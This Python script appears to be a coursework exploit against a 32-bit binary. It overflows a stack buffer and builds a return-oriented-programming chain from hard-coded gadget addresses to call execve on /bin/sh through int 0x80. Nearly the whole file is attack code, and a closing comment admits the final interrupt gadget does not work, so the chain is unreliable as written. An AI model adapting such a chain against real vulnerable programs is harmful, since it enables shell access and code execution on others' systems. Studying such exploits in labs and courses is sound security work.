#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# GDB Data
buf = 0xfffeebec
ebp = 0xfffeec58

# GADGETS

# Gadget sets EAX and EBX
# pop %eax; pop %edx; pop %ebx; ret;
g1 = 0x8056044
g1_b = pack("<I", g1)

# Gadget 2 sets memory to $0
# movl $0x0, 0x1860(%eax); ret;
g2 = 0x8056f2e
g2_b = pack("<I", g2)

# Gadget 3 sets EDX, ECX, and EBX
# pop %edx; pop %ecx; pop %ebx; ret;
g3 = 0x806dea1
g3_b = pack("<I", g3)

# Gadget 4 increments EAX
# inc %eax; pop %edi; ret;
g4 = 0x805e5fc
g4_b = pack("<I", g4)

# intr  interrupts
# int $0x80
intr = 0x806e7b0
intr_b = pack("<I", intr)

# DESIRED STACK LAYOUT
# buf: /bin/sh
#      0x00000000           <- Set by g2
#      buf
#      0x00000000
# --- Padding ---

# ra:  g1
#      buf+str_len - 0x1860 <- Sets EAX
# --- 8 bytes garbage ---

#      g2                   <- Moves $0 onto stack

#      g1
#      buf+str_len+8 - 0x1860 <- Sets EAX

#      g2                   <- Moves $0 onto stack

#      g1
#      0xFFFFFFFF           <- Sets EAX
# --- 8 bytes garbage ---

# *** REPEAT 12 TIMES ***
#     g4
# --- 4 bytes garbage ---
# *** END REPEAT ***

#      g3
#      buf+str_len          <- Sets EDX
#      buf+str_len+4        <- Sets ECX
#      buf                  <- Sets EBX

#      intr

# Write starting at buf
buf_str = b"/bin/sh"
data_str = (b"A" * 4) + pack("<I", buf) + pack("<I", buf+len(buf_str))
padding = b"A" * (ebp - (buf+len(buf_str)+len(data_str)) + 4) # Pad til ret_addr

# Write starting at ret_addr
gadget_str  = g1_b 
gadget_str += pack("<I", buf+len(buf_str)-0x1860)
gadget_str += b"A" * 8

gadget_str += g2_b

gadget_str += g1_b
gadget_str += pack("<I", buf+len(buf_str)+8-0x1860)
gadget_str += b"A" * 8

gadget_str += g2_b

gadget_str += g1_b
gadget_str += pack("<I", 0xFFFFFFFF)
gadget_str += b"A" * 8

for i in range(12):
    gadget_str += g4_b
    gadget_str += b"A" * 4

gadget_str += g3_b
gadget_str += pack("<I", buf+len(buf_str))
gadget_str += pack("<I", buf+len(buf_str) + 4)
gadget_str += pack("<I", buf)

gadget_str += intr_b

# For some reason the above int $0x80 isn't working so here's another
# This one also doesn't work...
# gadget_str += pack("<I", 0x806b681)

sys.stdout.buffer.write(buf_str + data_str + padding + gadget_str)

